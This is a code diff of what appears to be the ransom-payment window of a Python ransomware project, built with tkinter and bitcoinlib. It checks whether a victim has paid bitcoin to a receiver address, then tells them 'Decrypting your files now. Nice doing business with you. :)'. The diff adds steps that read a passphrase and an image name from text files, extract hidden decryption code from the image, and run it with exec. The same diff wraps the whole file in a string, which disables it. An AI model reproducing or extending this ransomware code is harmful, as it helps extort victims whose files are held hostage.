@@ -1,7 +1,8 @@
-from tkinter import *
+'''from tkinter import *
 from PIL import Image, ImageTk
-from bitcoinlib.wallets import wallet_exists, wallet_create_or_open
-from bitcoinlib.services.services import Service
+#from bitcoinlib.wallets import wallet_exists, wallet_create_or_open
+#from bitcoinlib.services.services import Service
+#from extract import extract_file
 
 
 def clicking_submit():
@@ -76,15 +77,38 @@ def clicking_submit():
             # Checks if the user successfully sent the specified number of bitcoins
             if address == receiver_address:
                 import os
-                decryption_executable_files = ["decrypt.py", "decrypt.exe"]
+                # Extracts the key from a specified image
+                with open("passphrase.txt", "r") as file:
+                    lines = file.readlines()
+                    passphrase = lines[0].strip("\n")
+
+                with open("images.txt", "r") as file:
+                    lines = file.readlines()
+                    image_containing_decryption_code: str = lines[3].strip("\n")
+
+                try:
+                    decryption_code_found: bool = os.path.exists(image_containing_decryption_code)
+                    if decryption_code_found:
+                        code_to_decrypt_files: str = extract_file(image_containing_decryption_code, passphrase)
+                    else:
+                        raise FileNotFoundError(
+                            f"The image name/path {image_containing_decryption_code} doesn't exist in the current directory."
+                            f"Either the name fed to the variable in the code to be updated or the image "
+                            f"specified just doesn't exist.")
+                except FileNotFoundError as fnfe:
+                    print(f"File Not Found: {fnfe}")
+                    return
+                except Exception as e:
+                    print(f"An unexpected error occurred: {e}")
+                    return
+
                 # Looks for the decryption file to decrypt a user's file
-                for executable in decryption_executable_files:
-                    if os.path.exists(executable):
-                        transaction_details_label = Label(text=transaction_details, fg="blue")
-                        transaction_details_label.pack()
-                        successful_transaction_label = Label(text="Decrypting your files now. Nice doing business with you. :)", fg="green")
-                        successful_transaction_label.pack()
-                        exec(f"{executable}")
+                if os.path.exists(code_to_decrypt_files):
+                    transaction_details_label = Label(text=transaction_details, fg="blue")
+                    transaction_details_label.pack()
+                    successful_transaction_label = Label(text="Decrypting your files now. Nice doing business with you. :)", fg="green")
+                    successful_transaction_label.pack()
+                    exec(f"{code_to_decrypt_files}")
 
         print(f"\nTransaction Details: {transaction_details}")
 
@@ -151,3 +175,4 @@ round = 1
 setup_round_1()
 
 window.mainloop()
+'''
